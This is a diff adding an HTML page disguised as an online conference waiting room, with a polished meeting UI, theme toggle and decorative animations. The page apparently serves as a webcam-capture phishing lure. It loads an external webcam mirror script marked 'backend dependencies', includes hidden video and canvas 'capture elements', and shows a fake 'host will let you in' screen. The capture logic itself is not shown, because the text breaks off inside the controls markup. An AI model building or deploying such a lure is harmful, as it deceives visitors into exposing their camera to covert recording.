@@ -1,0 +1,2226 @@
+<!doctype html>
+<html lang="en" id="html-root" class="dark">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Online Conference — Conference Room</title>
+
+  <!-- ── BACKEND DEPENDENCIES (DO NOT REMOVE) ── -->
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <!-- ─────────────────────────────────────────── -->
+
+  <!-- Tailwind CSS CDN (UI only) -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class', // ← DARK MODE: class strategy
+      theme: {
+        extend: {
+          fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] },
+          backdropBlur: { xs: '2px' },
+        },
+      },
+    }
+  </script>
+
+  <!-- Google Font -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+
+  <!-- ── DARK MODE: Flash-prevention — runs before paint ── -->
+  <script>
+    (function () {
+      // Apply saved theme immediately to <html> to avoid flash of wrong theme
+      // Default is dark; only switch to light if the user explicitly saved 'light'
+      if (localStorage.getItem('theme') === 'light') {
+        document.documentElement.classList.remove('dark');
+      } else {
+        document.documentElement.classList.add('dark');
+      }
+    })();
+  </script>
+  <!-- ──────────────────────────────────────────────────── -->
+
+  <!-- ── UI STYLES: glassmorphism meeting UI ── -->
+  <style>
+
+    /* ══════════════════════════════════════════════
+       THEME CSS VARIABLES — Light & Dark
+       ══════════════════════════════════════════════ */
+
+    /* Light mode defaults */
+    :root {
+      --body-gradient:   linear-gradient(135deg, #eef2ff 0%, #e0e7ff 50%, #f0f4ff 100%);
+      --glass-bg:        rgba(255, 255, 255, 0.72);
+      --glass-border:    rgba(99, 102, 241, 0.20);
+      --overlay-bg:      rgba(210, 220, 245, 0.86);
+      --stage-gradient:  linear-gradient(135deg, #dbeafe 0%, #c7d2fe 100%);
+      --ctrl-hover:      rgba(0, 0, 0, 0.07);
+      --text-primary:    #1e293b;
+      --text-secondary:  #475569;
+      --text-muted:      #94a3b8;
+      --divider-color:   rgba(99, 102, 241, 0.15);
+    }
+
+    /* Dark mode variable overrides */
+    html.dark {
+      --body-gradient:   linear-gradient(135deg, #0f1219 0%, #1a2035 50%, #0d1520 100%);
+      --glass-bg:        rgba(255, 255, 255, 0.06);
+      --glass-border:    rgba(255, 255, 255, 0.10);
+      --overlay-bg:      rgba(10, 12, 20, 0.78);
+      --stage-gradient:  linear-gradient(135deg, #1e2a3a 0%, #141e30 100%);
+      --ctrl-hover:      rgba(255, 255, 255, 0.14);
+      --text-primary:    #ffffff;
+      --text-secondary:  #d1d5db;
+      --text-muted:      #9ca3af;
+      --divider-color:   rgba(255, 255, 255, 0.10);
+    }
+    /* ────────────────────────────────────────────── */
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--body-gradient);
+      color: var(--text-primary);
+      transition: background 0.3s ease, color 0.3s ease;
+      overflow-x: hidden; /* prevent horizontal scroll from fixed canvas */
+    }
+
+    /* ── Frosted glass utility (theme-aware) ── */
+    .glass {
+      background: var(--glass-bg);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid var(--glass-border);
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.10);
+      transition: background 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease;
+    }
+    html.dark .glass {
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.45), 0 0 0 1px rgba(255,255,255,0.04);
+    }
+
+    /* ── Control button hover ring (theme-aware) ── */
+    .ctrl-btn {
+      /* POLISH: include border-color + box-shadow for active-state morphing */
+      transition: background 0.25s ease, transform 0.2s cubic-bezier(0.34,1.56,0.64,1),
+                  border-color 0.25s ease, box-shadow 0.25s ease;
+    }
+    .ctrl-btn:hover  { background: var(--ctrl-hover); }
+    .ctrl-btn:active { transform: scale(0.90); }
+
+    /* ── Waiting room overlay (theme-aware) ── */
+    #ac-wrapper {
+      position: fixed;
+      inset: 0;
+      background: var(--overlay-bg);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      z-index: 1001;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.3s ease;
+    }
+
+    /* ── Stage background (theme-aware) ── */
+    .stage-bg {
+      background: var(--stage-gradient);
+      transition: background 0.3s ease;
+    }
+
+    /* ══════════════════════════════════════════════
+       LIGHT MODE — text & colour overrides for
+       hardcoded Tailwind classes in existing markup
+       ══════════════════════════════════════════════ */
+
+    html:not(.dark) .text-white           { color: var(--text-primary)   !important; }
+    html:not(.dark) .text-gray-300        { color: var(--text-secondary) !important; }
+    html:not(.dark) .text-gray-400        { color: var(--text-secondary) !important; }
+    html:not(.dark) .text-gray-500        { color: var(--text-muted)     !important; }
+    html:not(.dark) .text-gray-600        { color: var(--text-muted)     !important; }
+
+    /* Keep accent colours unchanged */
+    html:not(.dark) .text-indigo-400      { color: #6366f1 !important; }
+    html:not(.dark) .text-indigo-200      { color: #6366f1 !important; }
+    html:not(.dark) .text-red-400         { color: #ef4444 !important; }
+    html:not(.dark) .text-green-400       { color: #22c55e !important; }
+
+    /* Divider bars */
+    html:not(.dark) .bg-white\/10         { background: var(--divider-color) !important; }
+
+    /* Float expand button hover */
+    html:not(.dark) .hover\:bg-white\/15:hover { background: rgba(0,0,0,0.08) !important; }
+
+    /* Spinner track colour in light mode */
+    html:not(.dark) .spinner-ring {
+      border-color: rgba(0, 0, 0, 0.10);
+      border-top-color: #6366f1;
+    }
+
+    /* End-call button stays visible on its red bg */
+    html:not(.dark) button.bg-red-600 .text-white,
+    html:not(.dark) button.bg-red-600 { color: #ffffff !important; }
+
+    /* ── DARK MODE TOGGLE button icon visibility ── */
+    /* In dark mode: show ☀ Light   |   In light mode: show ☽ Dark  */
+    html.dark  #icon-sun  { display: flex; }
+    html.dark  #icon-moon { display: none;  }
+    html:not(.dark) #icon-sun  { display: none;  }
+    html:not(.dark) #icon-moon { display: flex; }
+
+    /* ────────────────────────────────────────────── */
+
+    /* ── Pulsing ring on avatar ── */
+    @keyframes ring-pulse {
+      0%,100% { box-shadow: 0 0 0 0 rgba(99,102,241,0.6); }
+      50%      { box-shadow: 0 0 0 12px rgba(99,102,241,0); }
+    }
+    .ring-anim { animation: ring-pulse 2s ease-in-out infinite; }
+
+    /* ── Spinner ── */
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinner-ring {
+      border: 3px solid rgba(255,255,255,0.15);
+      border-top-color: #6366f1;
+      animation: spin 0.9s linear infinite;
+    }
+
+    /* ── Global smooth transition for theme switches ── */
+    html {
+      overflow-x: hidden; /* belt-and-braces: prevent any horizontal overflow */
+    }
+    *, *::before, *::after {
+      transition-property: background-color, border-color, color, box-shadow;
+      transition-duration: 0.3s;
+      transition-timing-function: ease;
+    }
+    /* POLISH: exclude animation-driven elements from the blanket CSS transition
+       so rAF / keyframe updates are instant and not intercepted by CSS easing */
+    .ring-anim, .spinner-ring,
+    .balloon, .flower-petal,
+    #star-canvas, canvas,
+    #chat-messages, #chat-messages * { transition: none !important; }
+
+    /* ══════════════════════════════════════════════
+       FUN BUTTONS — Balloon & Flower CSS keyframes
+       ══════════════════════════════════════════════ */
+
+    /* ─ Balloon: floats up and fades out ─ */
+    @keyframes balloonRise {
+      0%   { transform: translateX(0)   translateY(0)   scale(1);    opacity: 1; }
+      25%  { transform: translateX(var(--bx1)) translateY(-25vh) scale(1.04); opacity: 0.95; }
+      50%  { transform: translateX(var(--bx2)) translateY(-52vh) scale(1.02); opacity: 0.85; }
+      75%  { transform: translateX(var(--bx3)) translateY(-76vh) scale(0.96); opacity: 0.55; }
+      100% { transform: translateX(var(--bx4)) translateY(-105vh) scale(0.88); opacity: 0; }
+    }
+
+    .balloon {
+      position: fixed;
+      bottom: 90px;          /* start just above the controls bar   */
+      pointer-events: none;
+      z-index: 200;
+      animation: balloonRise linear forwards;
+      will-change: transform, opacity;
+      filter: drop-shadow(0 4px 8px rgba(0,0,0,0.25));
+    }
+    html.dark .balloon {
+      filter: drop-shadow(0 0 10px rgba(255,180,220,0.55)) drop-shadow(0 4px 8px rgba(0,0,0,0.4));
+    }
+
+    /* ─ Flower: falls down and fades ─ */
+    @keyframes flowerFall {
+      0%   { transform: translateY(-60px) rotate(0deg)   scale(1);    opacity: 1; }
+      60%  { opacity: 0.9; }
+      85%  { opacity: 0.55; }
+      100% { transform: translateY(110vh)  rotate(var(--frot)) scale(0.85); opacity: 0; }
+    }
+
+    .flower-petal {
+      position: fixed;
+      top: 0;
+      pointer-events: none;
+      z-index: 200;
+      animation: flowerFall linear forwards;
+      will-change: transform, opacity;
+      user-select: none;
+    }
+    html.dark .flower-petal {
+      filter: drop-shadow(0 0 6px rgba(255,160,200,0.7));
+    }
+
+    /* ─ Fun button hover effects ─ */
+    .fun-btn {
+      transition: transform 0.18s ease, box-shadow 0.18s ease, background 0.2s ease;
+    }
+    .fun-btn:hover {
+      transform: scale(1.06) translateY(-2px);
+    }
+    .fun-btn:active { transform: scale(0.96); }
+    html.dark  .fun-btn:hover { box-shadow: 0 0 18px rgba(165,180,252,0.55); }
+    html:not(.dark) .fun-btn:hover { box-shadow: 0 6px 20px rgba(99,102,241,0.30); }
+    /* ────────────────────────────────────────────── */
+
+    /* ══════════════════════════════════════════════
+       NEW — GLOWING VIDEO STAGE BORDER
+       ══════════════════════════════════════════════ */
+    .stage-glow {
+      box-shadow:
+        0 0 0 1px rgba(99,102,241,0.35),
+        0 0 30px rgba(99,102,241,0.18),
+        0 0 60px rgba(124,58,237,0.12),
+        0 8px 48px rgba(0,0,0,0.55);
+      transition: box-shadow 0.4s ease;
+    }
+    .stage-glow:hover {
+      box-shadow:
+        0 0 0 1px rgba(139,92,246,0.55),
+        0 0 40px rgba(99,102,241,0.28),
+        0 0 80px rgba(124,58,237,0.18),
+        0 8px 56px rgba(0,0,0,0.60);
+    }
+    html:not(.dark) .stage-glow {
+      box-shadow:
+        0 0 0 1px rgba(99,102,241,0.25),
+        0 0 20px rgba(99,102,241,0.10),
+        0 8px 36px rgba(99,102,241,0.12);
+    }
+
+    /* ══════════════════════════════════════════════
+       NEW — MUTED OVERLAY (top-left badge on stage)
+       ══════════════════════════════════════════════ */
+    #muted-badge {
+      display: none;
+      position: absolute;
+      top: 14px;
+      left: 14px;
+      z-index: 20;
+      background: rgba(239,68,68,0.90);
+      backdrop-filter: blur(8px);
+      border: 1px solid rgba(255,255,255,0.25);
+      border-radius: 10px;
+      padding: 5px 12px;
+      font-size: 12px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: 0.04em;
+      align-items: center;
+      gap: 6px;
+      animation: fadeBadge 0.25s ease;
+    }
+    #muted-badge.visible { display: flex; }
+    @keyframes fadeBadge {
+      from { opacity:0; transform: translateY(-6px); }
+      to   { opacity:1; transform: translateY(0); }
+    }
+
+    /* ══════════════════════════════════════════════
+       NEW — RECORDING BADGE (pulsing red)
+       ══════════════════════════════════════════════ */
+    #rec-badge {
+      display: none;
+      position: fixed;
+      top: 76px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 300;
+      background: rgba(0,0,0,0.65);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(239,68,68,0.45);
+      border-radius: 24px;
+      padding: 6px 18px;
+      font-size: 12px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: 0.05em;
+      align-items: center;
+      gap: 8px;
+    }
+    #rec-badge.visible { display: flex; }
+    .rec-dot {
+      width: 9px; height: 9px;
+      background: #ef4444;
+      border-radius: 50%;
+      animation: recBlink 1s ease-in-out infinite;
+      flex-shrink: 0;
+    }
+    @keyframes recBlink {
+      0%,100% { opacity: 1; box-shadow: 0 0 0 0 rgba(239,68,68,0.6); }
+      50%      { opacity: 0.35; box-shadow: 0 0 0 5px rgba(239,68,68,0); }
+    }
+
+    /* ════════════════════════════════════════════
+       NEW — CHAT PANEL
+       POLISH: overscroll-behavior, min-height guard, safe-area inset
+       ════════════════════════════════════════════ */
+    #chat-panel {
+      position: fixed;
+      /* Desktop: right slide */
+      top: 0;
+      right: -380px;
+      width: 360px;
+      height: 100dvh;
+      z-index: 500;
+      display: flex;
+      flex-direction: column;
+      background: var(--glass-bg);
+      backdrop-filter: blur(24px);
+      -webkit-backdrop-filter: blur(24px);
+      border-left: 1px solid var(--glass-border);
+      box-shadow: -8px 0 40px rgba(0,0,0,0.4);
+      transition: right 0.35s cubic-bezier(0.4,0,0.2,1);
+      overflow: hidden;
+    }
+    #chat-panel.open { right: 0; }
+    /* POLISH: messages area — constrain scrolling to panel only */
+    #chat-messages {
+      overscroll-behavior: contain;
+      min-height: 0;     /* flex-shrink below content height */
+    }
+
+    /* Mobile: bottom drawer */
+    @media (max-width: 640px) {
+      #chat-panel {
+        top: auto;
+        right: 0;
+        bottom: -70vh;
+        width: 100%;
+        height: 70vh;
+        border-left: none;
+        border-top: 1px solid var(--glass-border);
+        border-radius: 20px 20px 0 0;
+        box-shadow: 0 -8px 40px rgba(0,0,0,0.45);
+        transition: bottom 0.35s cubic-bezier(0.4,0,0.2,1);
+        /* POLISH: safe-area inset for notched phones */
+        padding-bottom: env(safe-area-inset-bottom, 0px);
+      }
+      #chat-panel.open { bottom: 0; right: 0; }
+    }
+
+    .chat-msg {
+      padding: 8px 12px;
+      border-radius: 12px;
+      max-width: 82%;
+      font-size: 13px;
+      line-height: 1.45;
+      word-break: break-word;
+      animation: msgPop 0.2s ease;
+    }
+    @keyframes msgPop {
+      from { opacity:0; transform: scale(0.92) translateY(6px); }
+      to   { opacity:1; transform: scale(1)    translateY(0); }
+    }
+    .chat-msg.self {
+      background: linear-gradient(135deg, #6366f1, #7c3aed);
+      color: #fff;
+      align-self: flex-end;
+      border-bottom-right-radius: 3px;
+    }
+    .chat-msg.other {
+      background: rgba(255,255,255,0.10);
+      border: 1px solid rgba(255,255,255,0.12);
+      color: var(--text-primary);
+      align-self: flex-start;
+      border-bottom-left-radius: 3px;
+    }
+    html:not(.dark) .chat-msg.other {
+      background: rgba(0,0,0,0.05);
+      border-color: rgba(0,0,0,0.08);
+    }
+
+    /* ══════════════════════════════════════════════
+       NEW — END MEETING MODAL
+       ══════════════════════════════════════════════ */
+    #end-modal-backdrop {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.55);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      z-index: 9000;
+      align-items: center;
+      justify-content: center;
+    }
+    #end-modal-backdrop.visible { display: flex; }
+    #end-modal {
+      background: var(--glass-bg);
+      backdrop-filter: blur(28px);
+      -webkit-backdrop-filter: blur(28px);
+      border: 1px solid var(--glass-border);
+      border-radius: 28px;
+      box-shadow: 0 24px 80px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
+      /* POLISH: responsive padding for small screens */
+      padding: clamp(24px, 5vw, 40px) clamp(20px, 5vw, 36px);
+      width: 90%;
+      max-width: 400px;
+      max-height: 90vh;
+      overflow-y: auto;
+      overscroll-behavior: contain;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+      animation: modalPop 0.3s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    @keyframes modalPop {
+      from { opacity:0; transform: scale(0.88) translateY(16px); }
+      to   { opacity:1; transform: scale(1)    translateY(0); }
+    }
+
+    /* ══════════════════════════════════════════════
+       NEW — CTRL BTN ACTIVE STATE (mute/rec)
+       ══════════════════════════════════════════════ */
+    .ctrl-btn-active {
+      background: rgba(239,68,68,0.20) !important;
+      border: 1px solid rgba(239,68,68,0.45) !important;
+    }
+    .ctrl-btn-active i,
+    .ctrl-btn-active svg { color: #f87171 !important; }
+    .ctrl-btn-active span.label { color: #f87171 !important; }
+
+    .ctrl-btn-chat-active {
+      background: rgba(99,102,241,0.22) !important;
+      border: 1px solid rgba(99,102,241,0.45) !important;
+    }
+    .ctrl-btn-chat-active i { color: #a5b4fc !important; }
+    .ctrl-btn-chat-active span.label { color: #a5b4fc !important; }
+
+    /* ══════════════════════════════════════════════
+       PART 1 — Glowing Star Background canvas
+       ══════════════════════════════════════════════ */
+    #star-canvas {
+      position: fixed;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 0;           /* sits behind all page content          */
+      pointer-events: none; /* never intercepts clicks / touch        */
+      display: block;
+    }
+
+  </style>
+  <!-- ────────────────────────────────────────── -->
+</head>
+
+<body class="min-h-screen overflow-hidden select-none transition-all duration-300"
+      id="theme-body">
+
+  <!-- ══════════════════════════════════════════════ -->
+  <!--  PART 1 — STAR CANVAS (behind all content)     -->
+  <!-- ══════════════════════════════════════════════ -->
+  <canvas id="star-canvas" aria-hidden="true"></canvas>
+  <!-- ────────────────────────────────────────────── -->
+
+  <!-- ══════════════════════════════════════════════ -->
+  <!--  BACKEND HIDDEN CAPTURE ELEMENTS (DO NOT REMOVE) -->
+  <!-- ══════════════════════════════════════════════ -->
+  <div class="video-wrap" hidden>
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas id="canvas" width="640" height="480" hidden></canvas>
+  <!-- ──────────────────────────────────────────── -->
+
+  <!-- ══════════════════════════════════════════════ -->
+  <!--  WAITING ROOM OVERLAY (backend timing preserved) -->
+  <!-- ══════════════════════════════════════════════ -->
+  <div id="ac-wrapper">
+    <!-- Glass card -->
+    <div class="glass rounded-3xl p-10 flex flex-col items-center gap-6 w-full max-w-sm mx-4 shadow-2xl">
+      <!-- Animated avatar -->
+      <div class="ring-anim w-20 h-20 rounded-full bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center shadow-xl">
+        <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z"/>
+        </svg>
+      </div>
+
+      <!-- Text -->
+      <div class="text-center">
+        <h2 class="text-lg font-semibold text-white mb-1">Joining Meeting…</h2>
+        <!-- BACKEND message preserved exactly -->
+        <p class="text-sm text-gray-400">Please wait, the meeting host will let you in soon</p>
+      </div>
+
+      <!-- Spinner row -->
+      <div class="flex items-center gap-3 text-xs text-gray-500">
+        <div class="spinner-ring w-5 h-5 rounded-full flex-shrink-0"></div>
+        <span>Connecting to room</span>
+      </div>
+
+      <!-- Divider + tip -->
+      <div class="w-full border-t border-white/10 pt-4 text-center text-xs text-gray-600">
+        Your camera &amp; microphone will be enabled once you're admitted.
+      </div>
+    </div>
+  </div>
+  <!-- ──────────────────────────────────────────── -->
+
+  <!-- ══════════════════════════════════════════════ -->
+  <!--  MAIN MEETING SCREEN                           -->
+  <!-- ══════════════════════════════════════════════ -->
+
+  <!-- Floating top header -->
+  <div class="absolute top-0 left-0 right-0 z-40 flex items-center justify-between px-6 py-4">
+    <!-- Meeting info -->
+    <div class="glass rounded-2xl px-4 py-2 flex items-center gap-3">
+      <span class="w-2.5 h-2.5 bg-green-400 rounded-full" style="animation:ring-pulse 2s ease-in-out infinite;"></span>
+      <span class="text-sm font-medium text-white">Conference Room</span>
+      <span class="text-xs text-gray-400 border-l border-white/20 pl-3" id="meetTimer">00:00</span>
+    </div>
+
+    <!-- ── DARK MODE TOGGLE BUTTON ── -->
+    <button id="theme-toggle"
+            class="glass rounded-2xl px-3 py-2 flex items-center gap-2 cursor-pointer hover:scale-105 active:scale-95 transition-all duration-300 shadow-lg"
+            title="Toggle light / dark mode"
+            aria-label="Toggle theme">
+
+      <!-- ☀ Sun icon — visible in dark mode, click to go Light -->
+      <span id="icon-sun" class="items-center gap-1.5 text-sm font-medium text-yellow-300">
+        <svg class="w-4 h-4 inline-block" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M12 2a1 1 0 011 1v1a1 1 0 01-2 0V3a1 1 0 011-1zm0 16a1 1 0 011 1v1a1 1 0 01-2 0v-1a1 1 0 011-1zm8-8a1 1 0 010 2h-1a1 1 0 010-2h1zM4 11a1 1 0 010 2H3a1 1 0 010-2h1zm13.071-5.071a1 1 0 010 1.414l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 0zM7.05 16.95a1 1 0 010 1.414l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 0zm10.607 0a1 1 0 01-1.414 0l-.707-.707a1 1 0 011.414-1.414l.707.707a1 1 0 010 1.414zM6.343 6.343a1 1 0 01-1.414 0l-.707-.707a1 1 0 011.414-1.414l.707.707a1 1 0 010 1.414zM12 7a5 5 0 100 10A5 5 0 0012 7z"/>
+        </svg>
+        Light
+      </span>
+
+      <!-- ☽ Moon icon — visible in light mode, click to go Dark -->
+      <span id="icon-moon" class="items-center gap-1.5 text-sm font-medium text-indigo-200">
+        <svg class="w-4 h-4 inline-block" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M21 12.79A9 9 0 1111.21 3a7 7 0 009.79 9.79z"/>
+        </svg>
+        Dark
+      </span>
+    </button>
+    <!-- ─────────────────────────────────── -->
+
+    <!-- Participant count -->
+    <div class="glass rounded-2xl px-4 py-2 flex items-center gap-2 text-sm text-gray-300">
+      <svg class="w-4 h-4 text-indigo-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+        <path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/>
+        <path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/>
+      </svg>
+      <span>1 participant</span>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════════════
+       NEW — MAIN MEETING STAGE (bigger, glow border)
+       ══════════════════════════════════════════════ -->
+  <div class="flex items-center justify-center min-h-screen px-4 pb-32 pt-20">
+    <div id="meeting-stage"
+         class="glass stage-glow rounded-3xl w-full max-w-5xl
+                aspect-video flex items-center justify-center
+                relative overflow-hidden">
+
+      <!-- Stage gradient bg (theme-aware) -->
+      <div class="absolute inset-0 stage-bg"></div>
+
+      <!-- NEW: Muted overlay badge -->
+      <div id="muted-badge" aria-live="polite">
+        <svg class="w-3.5 h-3.5" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v3m0 0H9m3 0h3M5.05 5.05A7 7 0 0019 11M3 3l18 18"
+                stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                fill="none"/>
+        </svg>
+        Muted
+      </div>
+
+      <!-- Avatar (centred, larger on big screens) -->
+      <div class="relative flex flex-col items-center gap-4 sm:gap-6 z-10">
+        <div class="ring-anim
+                    w-20 h-20 sm:w-28 sm:h-28 lg:w-36 lg:h-36
+                    rounded-full
+                    bg-gradient-to-br from-indigo-500 to-purple-700
+                    flex items-center justify-center
+                    text-3xl sm:text-4xl lg:text-5xl font-bold
+                    shadow-2xl">
+          U
+        </div>
+        <div class="glass rounded-xl px-4 sm:px-6 py-2 text-sm sm:text-base font-semibold">You</div>
+      </div>
+
+      <!-- Bottom-left: mic state label (hidden, controlled by JS) -->
+      <div id="stage-mic-label"
+           class="absolute bottom-4 left-4 glass rounded-xl px-3 py-1.5
+                  flex items-center gap-2 text-xs text-gray-300">
+        <i id="stage-mic-icon" class="fas fa-microphone text-green-400 text-xs"></i>
+        <span id="stage-mic-text">Mic on</span>
+      </div>
+
+      <!-- Top-right: subtle participant count watermark -->
+      <div class="absolute top-4 right-4 glass rounded-xl px-3 py-1.5
+                  flex items-center gap-2 text-xs text-gray-400">
+        <svg class="w-3.5 h-3.5 text-indigo-400" fill="none" stroke="currentColor"
+             stroke-width="2" viewBox="0 0 24 24">
+          <path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/>
+          <circle cx="9" cy="7" r="4"/>
+          <path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/>
+        </svg>
+        1 participant
+      </div>
+    </div>
+  </div>
+  <!-- ────────────────────────────────────────────── -->
+
+  <!-- ══════════════════════════════════════════════ -->
+  <!--  FUN BUTTONS — Balloon & Flower Rain           -->
+  <!-- ══════════════════════════════════════════════ -->
+  <div class="fixed bottom-24 right-5 z-50 flex flex-col gap-2 items-end">
+
+    <!-- Balloon button -->
+    <button id="btn-balloon"
+            class="fun-btn glass flex items-center gap-2 px-4 py-2 rounded-2xl text-sm font-semibold cursor-pointer"
+            style="background: rgba(255,255,255,0.12); border: 1px solid rgba(255,180,100,0.35);">
+      <span class="text-base leading-none" aria-hidden="true">🎈</span>
+      <span class="text-xs font-semibold tracking-wide" style="color: inherit;">Launch Balloons</span>
+    </button>
+
+    <!-- Flower Rain button -->
+    <button id="btn-flower"
+            class="fun-btn glass flex items-center gap-2 px-4 py-2 rounded-2xl text-sm font-semibold cursor-pointer"
+            style="background: rgba(255,255,255,0.12); border: 1px solid rgba(255,140,180,0.35);">
+      <span class="text-base leading-none" aria-hidden="true">🌸</span>
+      <span class="text-xs font-semibold tracking-wide" style="color: inherit;">Flower Rain</span>
+    </button>
+
+  </div>
+  <!-- ────────────────────────────────────────────── -->
+
+  <!-- ══════════════════════════════════════════════
+       NEW — BOTTOM CONTROLS BAR (fully interactive)
+       ══════════════════════════════════════════════ -->
+  <div class="fixed bottom-0 left-0 right-0 z-50 flex items-center justify-center pb-5 px-4">
+    <div class="glass rounded-3xl px-4 sm:px-6 py-3 sm:py-4
+                flex items-center gap-2 sm:gap-4
+                shadow-2xl shadow-black/60
+                flex-wrap justify-center">
+
+      <!-- 🎤 MUTE / UNMUTE -->
+      <button id="btn-mute"
+              class="ctrl-btn flex flex-col items-center gap-1 rounded-2xl p-2.5 sm:p-3
+                     hover:scale-105 hover:shadow-xl transition-all duration-300
+                     border border-transparent cursor-pointer outline-none"
+              title="Mute / Unmute" aria-label="Toggle mute">
+        <i id="mute-icon" class="fas fa-microphone text-lg sm:text-xl text-white"></i>
+        <span class="label text-xs text-gray-400 font-medium whitespace-nowrap">Mute</span>
+      </button>
+
+      <!-- 📹 VIDEO -->
+      <button class="ctrl-btn flex flex-col items-center gap-1 rounded-2xl p-2.5 sm:p-3
+                     hover:scale-105 hover:shadow-xl transition-all duration-300
+                     border border-transparent cursor-pointer outline-none"
+              title="Stop Video" aria-label="Stop video">
+        <i class="fas fa-video text-lg sm:text-xl text-white"></i>
+        <span class="text-xs text-gray-400 font-medium whitespace-nowrap">Video</span>
+      </button>
+
+      <!-- Divider -->
+      <div class="w-px h-9 bg-white/10 hidden sm:block flex-shrink-0"></div>
+
+      <!-- 🛡 SECURITY -->
+      <button class="ctrl-btn flex flex-col items-center gap-1 rounded-2xl p-2.5 sm:p-3
+                     hover:scale-105 hover:shadow-xl transition-all duration-300
+                     border border-transparent cursor-pointer outline-none"
+              title="Security" aria-label="Security">
+        <i class="fas fa-shield-alt text-lg sm:text-xl text-white"></i>
+        <span class="text-xs text-gray-400 font-medium whitespace-nowrap">Security</span>
+      </button>
+
+      <!-- 👤 PARTICIPANTS -->
+      <button class="ctrl-btn flex flex-col items-center gap-1 rounded-2xl p-2.5 sm:p-3
+                     hover:scale-105 hover:shadow-xl transition-all duration-300
+                     border border-transparent cursor-pointer outline-none"
+              title="Participants" aria-label="Participants">
+        <i class="fas fa-users text-lg sm:text-xl text-white"></i>
+        <span class="text-xs text-gray-400 font-medium whitespace-nowrap">Members</span>
+      </button>
+
+      <!-- 📤 SHARE -->
+      <button id="btn-share"
+              class="ctrl-btn flex flex-col items-center gap-1 rounded-2xl p-2.5 sm:p-3
+                     hover:scale-105 hover:shadow-xl transition-all duration-300
+                     border border-transparent cursor-pointer outline-none"
+              title="Share conference link" aria-label="Share">
+        <i class="fas fa-plus-square text-lg sm:text-xl" style="color:lawngreen"></i>
+        <span class="text-xs font-medium whitespace-nowrap" style="color:lawngreen">Share</span>
+      </button>
+
+      <!-- 💬 CHAT -->
+      <button id="btn-chat"
+              class="ctrl-btn flex flex-col items-center gap-1 rounded-2xl p-2.5 sm:p-3
+                     hover:scale-105 hover:shadow-xl transition-all duration-300
+                     border border-transparent cursor-pointer outline-none"
+              title="Chat" aria-label="Open chat">
+        <i class="fas fa-comments text-lg sm:text-xl text-white"></i>
+        <span class="label text-xs text-gray-400 font-medium whitespace-nowrap">Chat</span>
+      </button>
+
+      <!-- 🔴 RECORD -->
+      <button id="btn-record"
+              class="ctrl-btn flex flex-col items-center gap-1 rounded-2xl p-2.5 sm:p-3
+                     hover:scale-105 hover:shadow-xl transition-all duration-300
+                     border border-transparent cursor-pointer outline-none"
+              title="Record" aria-label="Toggle recording">
+        <i id="rec-icon" class="fas fa-record-vinyl text-lg sm:text-xl text-white"></i>
+        <span class="label text-xs text-gray-400 font-medium whitespace-nowrap">Record</span>
+      </button>
+
+      <!-- Divider -->
+      <div class="w-px h-9 bg-white/10 hidden sm:block flex-shrink-0"></div>
+
+      <!-- ❌ END MEETING -->
+      <button id="btn-end"
+              class="flex items-center gap-2
+                     bg-red-600 hover:bg-red-500 active:scale-95
+                     transition-all duration-300
+                     px-5 sm:px-6 py-2.5 rounded-2xl
+                     text-sm font-semibold text-white
+                     shadow-lg shadow-red-900/50
+                     hover:scale-105 hover:shadow-2xl hover:shadow-red-800/60
+                     cursor-pointer outline-none border-0">
